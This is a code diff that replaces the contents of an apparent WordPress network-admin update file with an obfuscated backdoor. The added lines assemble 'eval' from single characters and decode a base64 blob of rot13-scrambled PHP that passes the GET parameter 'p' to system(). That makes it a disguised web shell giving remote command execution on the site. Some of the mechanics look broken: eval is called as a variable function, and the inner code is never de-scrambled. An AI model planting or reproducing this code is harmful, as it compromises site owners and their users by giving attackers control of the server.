@@ -1,27 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Update/Install Plugin/Theme network administration panel.
- *
- * @package WordPress
- * @subpackage Multisite
- * @since 3.1.0
- */
-
-if ( isset( $_GET['action'] ) && in_array( $_GET['action'], array( 'update-selected', 'activate-plugin', 'update-selected-themes' ), true ) ) {
-	define( 'IFRAME_REQUEST', true );
-}
-
-/** Load WordPress Administration Bootstrap */
-require_once __DIR__ . '/admin.php';
-
-require ABSPATH . 'wp-admin/update.php';
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogSGNxbmdyL1ZhZmdueXkgQ3lodHZhL0d1cnpyIGFyZ2piZXggbnF6dmF2Zmdlbmd2YmEgY25hcnkuCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBaaHlndmZ2Z3IKICogQGZ2YXByIDMuMS4wCiAqLwoKdnMgKCB2ZmZyZyggJF9UUkdbJ25wZ3ZiYSddICkgJiYgdmFfbmVlbmwoICRfVFJHWyducGd2YmEnXSwgbmVlbmwoICdoY3FuZ3ItZnJ5cnBncnEnLCAnbnBndmluZ3ItY3lodHZhJywgJ2hjcW5nci1mcnlycGdycS1ndXJ6cmYnICksIGdlaHIgKSApIHsKCXFyc3ZhciggJ1ZTRU5aUl9FUkRIUkZHJywgZ2VociApOwp9CgovKiogWWJucSBKYmVxQ2VyZmYgTnF6dmF2Zmdlbmd2YmEgT2JiZ2ZnZW5jICovCmVyZGh2ZXJfYmFwciBfX1FWRV9fIC4gJy9ucXp2YS5jdWMnOwoKZXJkaHZlciBOT0ZDTkdVIC4gJ2pjLW5xenZhL2hjcW5nci5jdWMnOwoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
